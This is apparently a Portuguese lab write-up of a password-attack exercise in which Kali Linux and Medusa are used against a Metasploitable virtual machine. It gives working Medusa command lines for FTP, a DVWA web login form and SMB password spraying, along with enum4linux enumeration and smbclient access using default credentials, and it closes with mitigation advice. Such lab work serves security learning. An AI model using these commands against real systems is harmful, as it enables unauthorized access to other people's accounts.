# Ataque-de-Brute-Force-de-Senhas-com-Medusa-e-Kali-Linux
Simulação de um ataque de Brute Force de Senhas com Kali Linux e Medusa utilizando Metasploitable como alvo.

**OBJETIVO**
	Vamos fazer um ataque de Brute Force de senhas com Kali LInux e Medusa.
	O objetivo é entender com se promove o ataque com o objetivo de aprender como funciona na prática e como aprender a defender, empresas, instituições e pessoas.

**PROTOCOLOS DE AUTENTICAÇÃO.**
	Entender como funciona os protocolos de autenticação com o objetivo de aprender como funcionam esse processo.
	É importante frisar que o protocolo de autenticação, facilita ou dificulta o objetivo do invasor.

**OS PRINCIPAIS TIPOS DE ATAQUE:** 
	O ataque de Força Bruta em senhas não dependem de vulnerabilidade do  sistema em si, mas de fraquezas na escolha de senhas. 

**Ataque de Dicionário** 
	Ataque tradicional que utiliza wordlist (milhares de senhas e usuários geralmente baixadas da internet). Geralemente são usuários e senhas fáceis de identificar a ex: 1234556, visitante1234, etc.
		
**Ataque de Brute Force (Permutação)**
	Ataque baseado combinações possíveis de caracteres.
	O problema é o número de combinações que podem ser geradas a depender do tamanho da senha. 
	Esse ataque pode ser inviável devido ao tamanho da senha, do tempo disponível e se o alvo usar MFA.
	
**Ataque Hibrido**
	Parte de uma wordlist e regras de modificações. Pode ser feito atravpes da junção de duas listas. O software fará a combinação entre as duas listas podendo obtar mais sucesso do que os ataques anteriores.

**Password Sprayng.**
	Um ataque mais estratégico, ao invés de tentar centenas de senhas, o atacante vai testar senhas comuns, ex 123456 para todos os e-mails de um empresa. 

**Credential Stuffing**
	Baseado no uso de credenciais vazadas.
	
**Foi criado a Maquina Virtual. Instalado o Kali Linux e o Metasploitable.** 
	Configurado a Placa de rede em ambos para haver comunicação (figura 2)
	Feito o ping no IP da vítima para confirmar a conexão. (Figura 3)
	
Foi feito o escaneamento de portas com o nmap buscando portas abertas, versão do OS e se a conexão direta com o FTP está ativa (figuras 05 e 06).

**Foram criado as wordlists de usuário e senha.**
	echo "msfadmin" > users.txt.
	echo -e "msfadmin\n123456\nqwerty" > pass.txt.
	medusa -h 192.168.56.105 -U users.txt -p pass.txt -M ftp -t 6.
	Após isso, foi tentado acessar direto pelo FTP, o que foi conseguido com sucesso. (figura 07).

**Procurar brechas e vulnerabilidades de login em sistemas web.**
**Foi tentado uma ataque a uma página de login de um sistema web.**
	http://192.168.56.105/dvwa/login.php
	A resposta foi negativa devido erro de login e senha. 
	Nos parâmetros de rede apresentam detalhes do ataque conforme imagem do Payload reportando o usuário e senha que foram usados. Na resposta, temos a negativa da tentativa. 

**Criaçao da Wordlist**
	echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
	echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

**Usando o Medusa para simular combinações de usuários e senhas.**
	medusa -h 192.168.56.105 -U users.txt -p pass.txt -M http \
	-m PAGE:'/dvwa/login.php' \
	-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
	-m 'FAIL=LOGIN failed' -t 6
Após rodar o código, foram encontradas as credenciais (figura 13) e obtivemos acesso ao sistema (figura 14).

**Atque em cadeia, enumeraçã o SMB + Password Sprayng.**

**SMB = Server Messenger Block é: utilizado para compartilhar arquivos, pastas e impressoras, realizar autenticação de usuários e também para comunicação entre máquinas windows e Linux via Samba.**

**Se estiver mal configurado ou exposto à internet, torna-se uma vulnerabilidade para ataques.**
	Será simulado uma situação em que consegui o acesso a uma rede interna, através de Phishing e descobri um servidor SMB ativo. 
	Descobrir os usuários ativos no sistema e testar senhas fracas sem bloquear nenhuma conta.
	Será feito através do Password Sprayng, técnica furtiva de ataque a senhas, evitando usar muitas senhas a um unico usuário o que causa o bloqueio de tentativas, farei o ataque a uma única senha a diversos usúários diferente. 
**Ataque extremamente silencioso, difícil de ser detectado e muito eficaz se usuários utilizam senhas fracas.**

**Comando para enumeração**
	enum4linux -a 192.168.56.105 | tee enum4_output.txt                
	less enum4_output.txt
	
**Criando as listas:**
	echo -e "user\nmsfadmin\nservice" > smb_users.txt
	echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
	medusa -h 192.168.56.105 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

**Testando o acesso smbcliente**
	smbclient -L //192.168.56.105 -U msfadmin
	Senha: msfadmin

**MITIGAÇÃO AO ATAQUE:**

Senhas fortes.
Verificação Multifator.
Bloqueio de IPs. 
Monitoramento Inteligente de Logs .
Segmentação da Rede. 
Auditorias regulares.
Treinamento de quem utiliza o sistema. 

  
